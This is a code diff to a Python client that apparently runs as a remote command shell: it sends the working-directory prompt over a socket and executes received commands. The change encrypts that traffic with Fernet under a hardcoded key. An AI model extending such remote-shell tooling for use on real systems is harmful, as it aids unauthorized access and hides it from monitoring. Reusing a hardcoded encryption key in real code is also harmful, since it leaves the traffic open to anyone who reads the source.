@@ -60,6 +60,7 @@ class Client(Commands):
         self.socket = None
         self.connection_retry = 5
         self.custom_commands = self.get_all_commands()
+        self.encryption_key = b'secretsecretsecretwbsecretsecretsecretsecre='
 
     def register_signal_handler(self):
         signal.signal(signal.SIGINT, self.quit_gracefully)
@@ -89,14 +90,25 @@ class Client(Commands):
 
     def print_output(self, output_str):
         sent_message = str.encode(output_str)
+        sent_message = self.encrypt(sent_message)
         self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
         print(output_str)
+    
+    def encrypt(self, message):
+        f = Fernet(self.encryption_key)
+        token = f.encrypt(message)
+        return token
 
+    def decrypt(self, ciphertext):
+        f = Fernet(self.encryption_key)
+        return f.decrypt(ciphertext)
+        
     def receive_commands(self):
         self.socket.recv(10)
         while True:
             try:
                 cwd = str.encode(str(os.getcwd()) + '> ')
+                cwd = self.encrypt(cwd)
                 self.socket.send(struct.pack('>I', len(cwd)) + cwd)
 
                 data = self.socket.recv(2048)
@@ -104,6 +116,7 @@ class Client(Commands):
                 if data == b'':
                     self.socket.send(2048)
                     break
+                data = self.decrypt(data)
                 command = self.parse_command(data)
                 if command == 'cd':
                     directory = data[3:].decode('utf-8')
